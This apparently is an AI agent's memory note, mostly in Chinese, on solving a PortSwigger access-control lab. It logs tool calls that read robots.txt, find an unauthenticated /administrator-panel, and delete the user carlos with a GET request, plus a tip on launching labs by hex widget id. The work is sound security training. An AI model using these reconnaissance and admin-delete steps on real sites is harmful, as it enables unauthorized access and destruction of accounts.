---
metadata:
  node_type: memory
name: "PRS lab solve unprotected admin functionality"
description: "题 2 未认证管理面 lab solved:widget id 需从 lab 页读 hex(slug 直接 launch 会 404),robots.txt 泄 /administrator-panel,匿名直达删除 carlos,banner 判 solved"
last_updated: 2026-10-08T13:49:30+08:00
created: 2026-10-08T13:49:30+08:00
---

题 2 `access-control/lab-unprotected-admin-functionality`,实例 `0add00d904b7dcf480654e74004c00d6` — **solved**:
`banner_verdict` 回 `solved:true` + `<h4>Congratulations, you solved the lab!</h4>`。

链路(6 步零弯路,全走件):
1. `range_launch launch lab-unprotected-admin-functionality`(裸 slug)→ 落 auth0,instance_url=null。
2. 带 jar 重试 → **404**(widget id ≠ slug)。
3. `page_read https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality`
   → lab_id `EFB3CD7D…A8DE2` + 题面(不碰 solution 块)。
4. `range_launch launch <hex> --jar /tmp/cj1.json` → instance_url(15.5s)。
5. `http_session get <inst>/robots.txt` → `Disallow: /administrator-panel`。
6. `http_session get <inst>/administrator-panel` → 匿名 200,列 wiener/carlos + delete 链接;
   `get <inst>/administrator-panel/delete?username=carlos` → 302 `/administrator-panel`;
   `banner_verdict` → solved。

要点/坑:
- 管理面**零鉴权**:匿名 jar 即可读页并删人,不需要登录。
- `range_launch` 的 widget id 必须是从 lab 页读出的 64 位 hex;传页面 slug 返回 404(带认证 jar 亦然)
  —— 与 IDOR 题同形,先 page_read 取 id 再 launch。
- 本次 `/tmp/cj1.json`(portswigger.net app-session jar)仍有效,`login.portswigger.net` 未再报 DNS 失败。
- 知识面:新建 `records/lab-unprotected-admin-functionality`(roject 库,31 行),出入边
  `records/independent-idor` + `access-control-family`(graph outbound 已确认双侧登记)。

